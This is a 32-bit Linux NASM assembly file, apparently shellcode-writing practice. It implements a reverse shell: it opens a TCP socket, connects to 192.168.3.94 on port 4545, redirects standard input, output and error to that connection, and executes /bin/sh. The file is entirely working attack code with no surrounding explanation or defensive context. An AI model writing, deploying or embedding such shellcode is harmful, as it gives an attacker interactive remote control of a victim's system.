; Filename: reverseShell.nasm
; Author:  Abdulrahman Alhoshani
;
;
; Purpose:

global _start			

section .text
_start:
	; Create Socket (socketcall(call,args))
	xor eax, eax		; zeroing
	mov al, 0x66		; socketcall
	xor ebx,ebx		
	mov bl, 1		; for creating the socket socket() call

	xor ecx, ecx		; zeroing
	push ecx		; IPROTO_IP
	push 1			; SOCK_STREAM
	push 2			; AF_INET

	mov ecx, esp		; saving address of our pushed argumnets
	int 0x80		; calling the system call
	;mov esi, eax		; socket status to esi

	;connect

	push 0x5e03a8c0  	;sin_addr=192.168.3.94
	push word 0xdd11  	;sin_port=4545 
	push WORD 2          	; First arguement: AF_INET = 2
	mov ecx,esp
	
	
	push 0x10               ; addrlen  = 0.0.0.0 (16 bits)
	push ecx                ; addr to sockaddr
	push eax                ; socketfd status

	mov ecx,esp
	mov al, 0x66
	mov bl, 3		; for connect call 
	int 0x80         	; call it


	; dup2	this will redirect input and output to the connected session
	;mov ebx, eax
	pop ebx
	xor ecx, ecx
	mov cl, 2
	loopy:
	mov al,	63		; 63 --> dup2 sys_call
	int 0x80
	dec ecx
	jns loopy

	; execve	"execve /bin/sh"
	xor eax, eax
	push eax

	push 0x68732f2f
	push 0x6e69622f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp


	mov al, 11
	int 0x80

